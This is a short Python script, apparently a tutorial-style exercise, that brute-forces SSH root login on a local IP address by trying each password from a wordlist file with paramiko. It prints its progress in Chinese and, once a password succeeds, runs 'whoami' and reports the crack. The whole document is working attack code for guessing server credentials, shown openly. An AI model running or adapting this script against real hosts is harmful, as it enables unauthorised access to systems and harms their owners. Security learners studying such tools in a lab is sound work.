#!/usr/bin/python
# -*- coding: utf-8 -*- 

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/home/justin/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect( ip, username=user, password=passwd)
    except Exception as e:
        print(e)
        return
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.exec_command(command)
        print('破解成功，执行命令 whoami：',str(ssh_session.recv(1024),encoding='utf-8'))
        
    exit()

fb = open('pass.txt', 'r', encoding='utf-8', errors='replace').readlines()
for i in fb:
    print('尝试密码：', i, end='')
    ssh_command('192.168.1.129', 'root', i.strip(), 'whoami')
